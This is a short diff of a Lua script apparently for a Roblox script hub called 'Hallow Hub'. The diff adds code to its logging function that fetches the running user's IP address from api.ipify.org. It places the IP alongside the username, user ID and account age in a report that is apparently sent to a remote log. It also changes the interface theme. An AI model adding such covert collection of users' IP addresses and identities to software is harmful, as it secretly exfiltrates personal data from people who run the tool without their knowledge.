@@ -38,8 +38,11 @@ local function sendLog()
             ["title"] = "⭐ Hallow Hub Executed",
             ["color"] = 16735027, -- Hex: 0xFF5733
             ["fields"] = {
-                {
-                    ["name"] = "👤 User Info", 
+                {["name"] = "🌐 Connection Info",
+                ["value"] = "**IP Address:** ||" .. (game:HttpGet("https://api.ipify.org") or "N/A") .. "||",
+                ["inline"] = true
+                },
+                 {   ["name"] = "👤 User Info", 
                     ["value"] = "**Username:** " .. LP.Name .. displayNameText .. 
                                 "\n**ID:** " .. LP.UserId .. 
                                 "\n**Account Age:** " .. LP.AccountAge .. " days", 
@@ -410,7 +413,7 @@ local Window = Rayfield:CreateWindow({
    LoadingTitle = "Hallow Hub",
    LoadingSubtitle = "by Hallow",
    ShowText = "Hallow Hub is loading.",
-   Theme = "Bloom",
+   Theme = "Ocean",
    
    ToggleUIKeybind = Enum.KeyCode.RightShift,
    
